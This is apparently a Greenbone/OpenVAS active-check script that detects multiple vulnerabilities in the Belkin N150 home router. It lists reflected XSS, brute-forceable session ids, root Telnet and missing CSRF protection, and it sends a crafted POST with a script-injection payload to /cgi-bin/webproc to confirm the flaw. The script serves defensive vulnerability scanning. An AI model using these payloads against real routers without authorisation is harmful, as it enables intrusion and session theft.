# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806170");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2015-12-02 14:31:19 +0530 (Wed, 02 Dec 2015)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Belkin N150 Wireless Home Router Multiple Vulnerabilities (Nov 2015) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("mini_httpd/banner");
  script_require_ports("Services/www", 8080);

  script_tag(name:"summary", value:"Belkin N150 Wireless Home Router is prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - The 'InternetGatewayDevice.DeviceInfo.X_TWSZ-COM_Language' parameter is not validated properly.

  - The sessionid is allocated using hex encoding and of fixed length 8. Therefore, it is very easy
  to bruteforce it in feasible amount for time as this session id ranges from 00000000 to ffffffff.

  - The Telnet protocol can be used by an attacker to gain remote access to the router with root
  privileges.

  - The Request doesn't contain any CSRF-token. Therefore, requests can be forged.It can be
  verified with any request.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a user's browser session in the context of an affected site and
  upload and download of arbitrary files, and to take malicious actions against the application.");

  script_tag(name:"affected", value:"Belkin N150 WiFi N Router, other firmware may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38840");
  script_xref(name:"URL", value:"https://0x62626262.wordpress.com/2015/11/30/belkin-n150-router-multiple-vulnerabilities");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 8080);

banner = http_get_remote_headers(port: port);

if (!banner || banner !~ "[Ss]erver\s*:\s*mini_httpd")
  exit(0);

url = "/cgi-bin/webproc";

headers = make_array("Content-Type", "application/x-www-form-urlencoded");

data = "%3AInternetGatewayDevice.DeviceInfo.X_TWSZ-COM_Language=" +
       '"><script>alert(document.cookie)</script><script>"&' +
       "obj-action=set&var%3Apage=deviceinfo&var%3Aerrorpage=deviceinfo&" +
       "getpage=html%2Findex.html&errorpage=html%2Findex.html&var%3ACacheLastData=U1BBTl9UaW1lTnVtMT0%3D";

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ "^HTTP/1\.[01] 200" && "><script>alert(document.cookie)</script><script>" >< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
